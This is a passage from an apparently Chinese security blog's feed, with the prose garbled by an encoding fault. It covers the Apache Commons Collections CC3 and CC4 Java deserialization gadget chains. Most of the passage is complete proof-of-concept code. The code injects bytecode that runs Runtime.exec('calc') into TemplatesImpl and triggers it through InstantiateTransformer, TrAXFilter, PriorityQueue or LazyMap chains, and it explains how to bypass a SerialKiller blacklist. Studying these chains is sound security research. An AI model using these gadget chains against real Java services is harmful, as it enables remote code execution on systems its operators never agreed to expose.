class="variable">nameField</span> <span class="operator">=</span> templatesclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;ki10Moc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ¶æ„bytecodeå­—æ®µ</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodeFiled</span> <span class="operator">=</span> templatesclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodeFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Code/JavaSecurityCode/cc3/target/classes/calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodeFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//å·¥å‚ç±»å­—æ®µ</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>() &#123;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è°ƒç”¨transformerä»»æ„æ–¹æ³•çš„æ¥å£,æ­¤å¤„é€šè¿‡InstantiateTransformerä»£æ›¿InvokerTransformer</span></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123; Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        Transformer[]  transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialioze(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialioze</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, CannotCompileException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        String AbstractTranslet=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl=<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        ClassPool classPool=ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        CtClass payload=classPool.makeClass(<span class="string">&quot;CommonsCollections44444444&quot;</span>);</span><br><span class="line">        payload.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        payload.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = payload.toBytecode();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).newInstance();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field field=templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        Field name=templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        Transformer[] trans = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chian</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(trans);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transCom</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chian);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">com</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        com.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        com.set(queue,transCom);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">        outputStream.writeObject(queue);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream inputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ç›¸è¾ƒäºå‰é¢çš„ cc é“¾ï¼Œå¤šçš„æ˜¯ä¸€ä¸ªç‰ˆæœ¬çš„æ›´æ–°&lt;/p&gt;
&lt;p&gt;ä¹‹å‰éƒ½æ˜¯ 3.2.1&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Javaå®‰å…¨" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Commons Collections3</title>
    <link href="https://ki10moc.github.io/2022/08/08/Commons%20Collections3/"/>
    <id>https://ki10moc.github.io/2022/08/08/Commons%20Collections3/</id>
    <published>2022-08-07T20:59:36.000Z</published>
    <updated>2023-06-18T11:27:01.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="çœæµ"><a class="markdownIt-Anchor" href="#çœæµ">#</a> çœæµ</h3><p><code>SerialKiller</code> <br> å¯ä»¥é€šè¿‡â¿Šåå•ä¸â½©åå•çš„â½…å¼æ¥é™åˆ¶ååºåˆ—åŒ–æ—¶å…è®¸é€šè¿‡çš„<br>ç±»ï¼Œå…¶ä¸­é™åˆ¶äº† cc1 å’Œ cc2 ä¸­å‘½ä»¤æ‰§è¡Œçš„ç±»ï¼Œ <code>InvokerTransformer</code></p><p><img src="https://img-blog.csdnimg.cn/7d5ea44763ff468e8a9c67e16920cc8f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><code>cc3</code>  å°±æ˜¯ä¸ºäº†ç»•è¿‡å¯¹å…¶çš„é™åˆ¶ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯ <code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>  æ¥æ‰§è¡Œ</p><p>ä¹Ÿå°±æ˜¯ <code>TrAXFilter</code>  çš„æ„é€ æ–¹æ³•ä¸­ <code>templates.newTransformer()</code>  è°ƒâ½¤åˆ°  <code>TemplatesImpl</code>  â¾¥çš„å­—èŠ‚ç <br><img src="https://img-blog.csdnimg.cn/d27e3c99816343619dd10aaa7d10fc2e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸‹é¢æ¥çœ‹çœ‹å½“æ²¡æœ‰äº† <code>invokerTransformer</code>  è¯¥å¦‚ä½•è°ƒç”¨ä»»æ„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                    <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                        + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­å‚æ•°å¦‚æœæ˜¯ <code>class</code>  ç±»å‹çš„<br>å°±ä¼šåˆ›å»ºä¸€ä¸ªç±»çš„æ„é€ å™¨å¹¶ä¸”è°ƒç”¨å…¶æ„é€ æ–¹æ³•</p><p>è¿™é‡Œåœ¨åŒç›®å½•ä¸‹å†™ä¸€ä¸ªæ¶æ„ç¨‹åºè®© poc å»è°ƒç”¨<br>ä½†æ˜¯å‡ºç°äº†ç©ºæŒ‡é’ˆçš„æŠ¥é”™<br>å‘ç°æ˜¯åœ¨è¿™ä¸ªå˜é‡çš„åœ°æ–¹å‡ºç°çš„<br>é‚£å°±æƒ³åŠæ³•è®©å…¶å˜é‡ç­‰äº <code>ABSTRACT_TRANSLET</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET))</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/94bc089ffaf04d6381bfb8139a64d307.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¹Ÿå°±æ˜¯æ¶æ„ç±»çš„çˆ¶ç±»è¦ç»§æ‰¿<br>å³ <code>AbstractTranslet</code> <br><img src="https://img-blog.csdnimg.cn/c65407c27dfb4dad90dd0fc7ec00f72e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å†æ¬¡æ‰§è¡Œå°±æˆåŠŸäº†</p><p><img src="https://img-blog.csdnimg.cn/260eebef201c44e6a1726ff488ceb476.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><code>calc.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å½“ <code>Instantiate Transformer</code>  å’Œ <code>TrAXFilter.TrAXFilter</code>  æˆåŠŸç»•è¿‡å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤<br>åé¢çš„å°±å’Œ <code>cc1</code>  éƒ½ä¸€æ ·äº†</p><h3 id="poc"><a class="markdownIt-Anchor" href="#poc">#</a> poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">temp</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> temp.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;ki10Moc&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> temp.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Code/JavaSecurityCode/cc3/target/classes/calc.class&quot;</span>));</span><br><span class="line"><span class="comment">//        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAHgoABgARCgASABMIABQKABIAFQcAFgcAFwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAYAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAApTb3VyY2VGaWxlAQAOVG91Y2hGaWxlLmphdmEMAAcACAcAGQwAGgAbAQAEY2FsYwwAHAAdAQAJVG91Y2hGaWxlAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAACAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAAEAAEABEADQASAAsAAAAEAAEADAAJAA0ADgACAAkAAAAmAAIAAQAAAAq4AAISA7YABFexAAAAAQAKAAAACgACAAAAFgAJABcACwAAAAQAAQAMAAEADwAAAAIAEA==&quot;);</span></span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> temp.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>() &#123;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        instantiateTransformer.transform(TrAXFilter.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, instantiateTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) cons.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">                Map.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,</span><br><span class="line">                handler</span><br><span class="line">        );</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> cons.newInstance(Retention.class, proxyMap);</span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(o);</span><br><span class="line">        unserialize(bytes);</span><br><span 